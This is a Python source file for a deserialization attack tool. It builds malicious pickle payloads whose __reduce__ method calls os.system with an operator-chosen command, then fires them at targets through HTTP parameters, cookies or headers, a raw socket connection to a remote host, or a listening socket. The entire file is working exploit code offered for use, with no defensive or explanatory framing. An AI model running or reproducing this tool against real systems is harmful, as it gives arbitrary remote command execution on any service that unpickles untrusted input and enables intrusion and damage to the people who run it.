import pickle
import base64
import requests
import socket
import argparse

class Utility:
    command = ""

    @staticmethod
    def b64pickle(payload):
        p = getattr(Payloads, payload)
        return base64.b64encode(pickle.dumps(p()))

    @staticmethod
    def urlpickle(payload):
        p = getattr(Payloads, payload)
        return base64.urlsafe_b64encode(pickle.dumps(p()))

    @staticmethod
    def plainpickle(payload):
        p = getattr(Payloads, payload)
        return pickle.dumps(p())

class Payloads:
    class oscmd:
        def __reduce__(self):
            import os
            return (os.system, (Utility.command,))

def updatecmd(new_cmd):
    Utility.command = new_cmd

def webreq(method, url, payload, param=None, cook=None, custom_header=None):
    methods = ["get", "post", "put", "patch"]
    payload = Utility.urlpickle(payload)
    payload = payload.decode("utf-8")
    headers = {custom_header:payload} or {}
    if method in methods:
        request_method = getattr(requests, method)
    if param:
        data = {param: payload} if method != "get" else {}
        response = request_method(
            url,
            params={param: payload} if method == "get" else None,
            data=data,
            cookies={cook: payload} if cook else None,
            headers=headers
        )
    else:
        response = request_method(
            url,
            cookies={cook: payload} if cook else None,
            headers=headers
        )
    return f"Firing webreq attack against {url}"

def socksend(rhost, rport, payload, enc, steps=0, use_ipv6=False):
    rport = int(rport)
    steps = int(steps)
    payload = Utility.b64pickle(payload) if enc else Utility.plainpickle(payload)
    family = socket.AF_INET6 if use_ipv6 else socket.AF_INET
    with socket.socket(family, socket.SOCK_STREAM) as s:
        s.connect((rhost, rport))
        for _ in range(steps):
            s.sendall(b"arb")
            s.recv(1024)
        s.sendall(payload)
        s.close()

def socklisten(lport, payload, enc, steps=0, use_ipv6=False):
    lport = int(lport)
    steps = int(steps)
    payload = Utility.b64pickle(payload) if enc else Utility.plainpickle(payload)
    family = socket.AF_INET6 if use_ipv6 else socket.AF_INET
    with socket.socket(family, socket.SOCK_STREAM) as s:
        s.bind(('localhost', lport))  # Bind to localhost or a specific IP address
        s.listen(1)
        conn, addr = s.accept()
        with conn:
            for _ in range(steps):
                conn.sendall(b"arb")
                conn.recv(1024)
            conn.sendall(payload)
            conn.close()

